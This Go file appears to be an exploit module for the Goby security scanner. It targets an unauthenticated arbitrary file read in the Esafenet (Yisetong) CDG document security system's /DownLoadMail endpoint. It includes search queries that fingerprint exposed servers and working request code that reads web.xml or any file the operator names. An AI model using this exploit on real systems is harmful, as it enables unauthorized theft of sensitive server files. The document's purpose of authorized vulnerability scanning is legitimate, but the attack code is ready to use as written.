package exploits

import (
	"fmt"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Yisetong Electronic Document Security Management System /DownLoadMail File Read Vulnerability",
    "Description": "<p>The Yisetong Electronic Document Security Management System (abbreviated as: CDG) is an electronic document security encryption software. The system uses driver-layer transparent encryption technology to encrypt and protect electronic documents, prevent internal employees from leaking information and external personnel from illegally stealing the core important data assets of the enterprise, and protect electronic documents throughout their life cycle. The system has multiple encryption methods such as transparent encryption, active encryption, and intelligent encryption. Users can deploy gradient document encryption protection with varying degrees of confidentiality according to the different levels of confidentiality of the department (such as core departments and ordinary departments), and achieve an organic combination of technology, management, and auditing. A three-dimensional overall information leakage prevention system is built internally, so that cost, efficiency, and security are balanced, and data security of electronic documents is achieved. The Yisetong Electronic Document Security Management System has an arbitrary file reading vulnerability at the DownLoadMail interface. Unauthenticated attackers can use this vulnerability to obtain sensitive file information within the system, causing the system to be in an extremely unsafe state.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2024-08-01",
    "PostTime": "2024-10-29",
    "Author": "2826161446@qq.com",
    "FofaQuery": "(body=\"CDGServer3\" && body!=\"DLP\") || ((((title=\"电子文档安全管理系统\" && (cert=\"esafenet\" || body=\"CDGServer3\")) || (body=\"CDGServer3/3g\" && body=\"/help/getEditionInfo.jsp\")) || body=\"CDGServer3/index.jsp\") && title!=\"数据泄露\" && title!=\"DLP\")",
    "GobyQuery": "(body=\"CDGServer3\" && body!=\"DLP\") || ((((title=\"电子文档安全管理系统\" && (cert=\"esafenet\" || body=\"CDGServer3\")) || (body=\"CDGServer3/3g\" && body=\"/help/getEditionInfo.jsp\")) || body=\"CDGServer3/index.jsp\") && title!=\"数据泄露\" && title!=\"DLP\")",
    "Level": "1",
    "Impact": "<p>The Yisetong Electronic Document Security Management System has an arbitrary file reading vulnerability at the DownLoadMail interface. Unauthenticated attackers can use this vulnerability to obtain sensitive file information within the system, causing the system to be in an extremely unsafe state.</p>",
    "Recommendation": "<p>1. Follow the manufacturer's official website and keep up with updated information in a timely manner: <a href=\"http://www.esafenet.com/product/277483397\">http://www.esafenet.com/product/277483397</a></p><p> 2. Set access policies and whitelist access through security devices such as firewalls. </p><p> 3. If not necessary, prohibit public network access to the system. </p>",
    "References": [
        "https://stack.chaitin.com/vuldb/detail/be7c857f-fe33-4752-abd7-a01e4ed8f3ce"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "web.xml,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "web.xml",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "2H1W"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全管理系统 /DownLoadMail 文件读取漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通电子文档安全管理系统(简称:CDG)是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同(如核心部门和普通部门)，部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统DownLoadMail接口处任意文件读取漏洞，未经身份验证的攻击者利用此漏洞获取系统内部敏感文件信息，导致系统处于极不安全的状态。<br></p>",
            "Recommendation": "<p>1、关注厂商官网，及时关注更新信息：<a href=\"http://www.esafenet.com/product/277483397\">http://www.esafenet.com/product/277483397</a></p><p>&nbsp;2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>亿赛通电子文档安全管理系统DownLoadMail接口处任意文件读取漏洞，未经身份验证的攻击者利用此漏洞获取系统内部敏感文件信息，导致系统处于极不安全的状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Yisetong Electronic Document Security Management System /DownLoadMail File Read Vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>The Yisetong Electronic Document Security Management System (abbreviated as: CDG) is an electronic document security encryption software. The system uses driver-layer transparent encryption technology to encrypt and protect electronic documents, prevent internal employees from leaking information and external personnel from illegally stealing the core important data assets of the enterprise, and protect electronic documents throughout their life cycle. The system has multiple encryption methods such as transparent encryption, active encryption, and intelligent encryption. Users can deploy gradient document encryption protection with varying degrees of confidentiality according to the different levels of confidentiality of the department (such as core departments and ordinary departments), and achieve an organic combination of technology, management, and auditing. A three-dimensional overall information leakage prevention system is built internally, so that cost, efficiency, and security are balanced, and data security of electronic documents is achieved. The Yisetong Electronic Document Security Management System has an arbitrary file reading vulnerability at the DownLoadMail interface. Unauthenticated attackers can use this vulnerability to obtain sensitive file information within the system, causing the system to be in an extremely unsafe state.<br></p>",
            "Recommendation": "<p>1. Follow the manufacturer's official website and keep up with updated information in a timely manner:&nbsp;<a href=\"http://www.esafenet.com/product/277483397\">http://www.esafenet.com/product/277483397</a></p><p>&nbsp;2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>&nbsp;3. If not necessary, prohibit public network access to the system.&nbsp;<br></p>",
            "Impact": "<p>The Yisetong Electronic Document Security Management System has an arbitrary file reading vulnerability at the DownLoadMail interface. Unauthenticated attackers can use this vulnerability to obtain sensitive file information within the system, causing the system to be in an extremely unsafe state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

	postOrGet_a3Zt8FVWFd := func(hostInfo *httpclient.FixUrl, filePath string) (string, error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		defineHeader := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
			"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
			"Accept":       "*/*",
		}

		urlPost := "/CDGServer3/esafenet/DownLoadMail"
		postData := fmt.Sprintf("path=/WEB-INF/&name=%s", filePath)

		resp, err := setPostRequest(hostInfo, urlPost, postData, defineHeader)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/CDGServer3/esafenet/DownLoadMail"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"web.xml": "<web-app>",
			}
			// 函数继承
			fileReadFunc := postOrGet_a3Zt8FVWFd

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for filePath, fileText := range defaultModeMap {
				resp, err := fileReadFunc(u, filePath)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.xml": {"web.xml", "<web-app>"},
			}
			// 此处需要修改：函数继承
			fileReadFunc := postOrGet_a3Zt8FVWFd

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := fileReadFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
